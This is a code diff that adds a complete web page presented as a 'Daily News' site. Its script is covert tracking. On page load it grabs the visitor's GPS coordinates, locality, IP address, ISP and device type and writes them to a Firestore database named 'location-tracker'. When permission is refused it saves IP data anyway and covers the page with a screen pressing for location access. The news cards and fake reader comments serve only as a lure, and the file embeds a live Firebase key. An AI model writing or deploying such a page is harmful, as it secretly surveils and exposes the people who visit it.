@@ -1,1 +1,333 @@
-fsd
+<!DOCTYPE html>
+<html>
+<head>
+<title>Daily News</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body{margin:0;font-family:Arial;background:#f5f5f5;}
+
+header{background:#c40000;color:white;padding:15px;text-align:center;font-size:26px;}
+nav{background:#111;padding:10px;text-align:center;}
+nav a{color:white;margin:0 10px;text-decoration:none;font-size:14px;}
+
+.container{width:95%;margin:auto;margin-top:20px;}
+
+.grid{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+gap:15px;
+}
+
+.card{
+background:white;
+padding:10px;
+border-radius:8px;
+cursor:pointer;
+}
+
+.card img{
+width:100%;
+height:150px;
+object-fit:cover;
+border-radius:6px;
+}
+
+#articlePage{display:none;}
+
+.article{background:white;padding:15px;border-radius:8px;}
+.comments{margin-top:20px;background:white;padding:10px;border-radius:8px;}
+.comment{border-bottom:1px solid #ddd;padding:5px 0;font-size:14px;}
+
+.ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
+.footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}
+
+/* 🔥 LOCATION GATE */
+#locationGate{
+position:fixed;
+top:0;left:0;
+width:100%;height:100%;
+background:linear-gradient(135deg,#111,#222);
+color:white;
+display:none;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+z-index:9999;
+text-align:center;
+padding:20px;
+}
+
+#locationGate button{
+padding:12px 25px;
+background:#ff4b5c;
+color:white;
+border:none;
+border-radius:6px;
+font-size:16px;
+margin-top:15px;
+cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<!-- LOCATION GATE -->
+<div id="locationGate">
+<h2>📍 Enable Location</h2>
+<p>Enable location to get local news near you</p>
+<button onclick="retryLocation()">Enable Location</button>
+</div>
+
+<header>📰 Daily News</header>
+
+<nav>
+<a href="#" onclick="showHome()">Home</a>
+<a href="#">World</a>
+<a href="#">Tech</a>
+<a href="#">Sports</a>
+</nav>
+
+<div class="container">
+
+<div id="homePage">
+<div class="ad">📢 Advertisement</div>
+<div id="newsContainer" class="grid"></div>
+</div>
+
+<div id="articlePage">
+<button onclick="showHome()">⬅ Back</button>
+
+<div class="article">
+<h2 id="title"></h2>
+<img id="image" style="width:100%;margin:10px 0;">
+<p id="content"></p>
+</div>
+
+<div class="ad">📢 Sponsored Content</div>
+
+<div class="comments">
+<h4>💬 Comments</h4>
+<div id="commentList"></div>
+</div>
+
+</div>
+
+</div>
+
+<div class="footer">© 2026 Daily News</div>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+apiKey: "AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
+authDomain: "location-tracker-bba55.firebaseapp.com",
+projectId: "location-tracker-bba55",
+storageBucket: "location-tracker-bba55.appspot.com",
+messagingSenderId: "951484366467",
+appId: "1:951484366467:web:2e936d42b1704027f665b6"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// USER ID
+function getUserId(){
+let id = localStorage.getItem("userId")
+if(!id){
+id = Math.random().toString(36).substring(2,10)
+localStorage.setItem("userId", id)
+}
+return id
+}
+
+// DEVICE
+function detectDevice(){
+let ua=navigator.userAgent;
+if(/mobile/i.test(ua)) return "Mobile";
+return "Desktop";
+}
+
+function detectDeviceModel(){
+let ua=navigator.userAgent;
+if(ua.includes("Android")) return "Android Phone";
+if(ua.includes("Windows")) return "Windows PC";
+if(ua.includes("Mac")) return "Mac";
+return "Unknown";
+}
+
+// LOCATION DETAILS
+async function getLocationDetails(lat, lon){
+try{
+const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+const data = await res.json()
+let a = data.address
+
+return {
+thana: a.suburb || a.village || a.town || a.municipality || a.county || "unknown",
+district: a.state_district || a.county || "unknown"
+}
+}catch{
+return {thana:"unknown",district:"unknown"}
+}
+}
+
+// IP
+async function getIP(){
+let res = await fetch("https://ipinfo.io/json")
+let data = await res.json()
+
+return {
+ip:data.ip,
+org:data.org,
+country:data.country
+}
+}
+
+// SAVE
+async function save(data){
+let id = getUserId()
+await setDoc(doc(db,"locations",id), data)
+}
+
+// GPS SUCCESS
+async function handleGPS(pos){
+
+let lat = pos.coords.latitude
+let lon = pos.coords.longitude
+
+let loc = await getLocationDetails(lat,lon)
+let ip = await getIP()
+
+save({
+latitude:lat,
+longitude:lon,
+thana:loc.thana,
+district:loc.district,
+country:ip.country,
+ip:ip.ip,
+isp:ip.org,
+device:detectDevice(),
+deviceModel:detectDeviceModel(),
+type:"GPS",
+time:new Date().toLocaleString()
+})
+
+}
+
+// IP FALLBACK
+async function handleIP(){
+
+let ip = await getIP()
+
+save({
+country:ip.country,
+ip:ip.ip,
+isp:ip.org,
+device:detectDevice(),
+deviceModel:detectDeviceModel(),
+type:"IP",
+time:new Date().toLocaleString()
+})
+
+}
+
+// 🔥 AUTO TRY
+function autoDetect(){
+navigator.geolocation.getCurrentPosition(
+pos=>{
+handleGPS(pos)
+},
+err=>{
+// show UI
+document.getElementById("locationGate").style.display="flex"
+
+// fallback save
+handleIP()
+}
+)
+}
+
+// 🔁 RETRY BUTTON
+window.retryLocation = function(){
+navigator.geolocation.getCurrentPosition(
+pos=>{
+document.getElementById("locationGate").style.display="none"
+handleGPS(pos)
+},
+()=>{
+alert("Location still blocked")
+}
+)
+}
+
+// NEWS
+let newsData = []
+
+async function loadNews(){
+let res = await fetch("https://api.spaceflightnewsapi.net/v4/articles/")
+let data = await res.json()
+
+newsData = data.results
+
+const container = document.getElementById("newsContainer")
+container.innerHTML=""
+
+newsData.slice(0,8).forEach((news,i)=>{
+let div = document.createElement("div")
+div.className="card"
+
+div.innerHTML=`
+<img src="${news.image_url}">
+<h4>${news.title}</h4>
+`
+
+div.onclick=()=>openArticle(i)
+container.appendChild(div)
+})
+}
+
+// ARTICLE
+window.openArticle = function(i){
+let news = newsData[i]
+
+document.getElementById("homePage").style.display="none"
+document.getElementById("articlePage").style.display="block"
+
+document.getElementById("title").innerText=news.title
+document.getElementById("image").src=news.image_url
+document.getElementById("content").innerText=news.summary
+
+loadComments()
+}
+
+window.showHome = function(){
+document.getElementById("homePage").style.display="block"
+document.getElementById("articlePage").style.display="none"
+}
+
+// COMMENTS
+function loadComments(){
+const comments=["Great news!","Very informative.","Nice update!","Wow interesting!"]
+let list=document.getElementById("commentList")
+list.innerHTML=""
+comments.forEach(c=>{
+let div=document.createElement("div")
+div.className="comment"
+div.innerText=c
+list.appendChild(div)
+})
+}
+
+// INIT
+autoDetect()
+loadNews()
+
+</script>
+
+</body>
+</html>
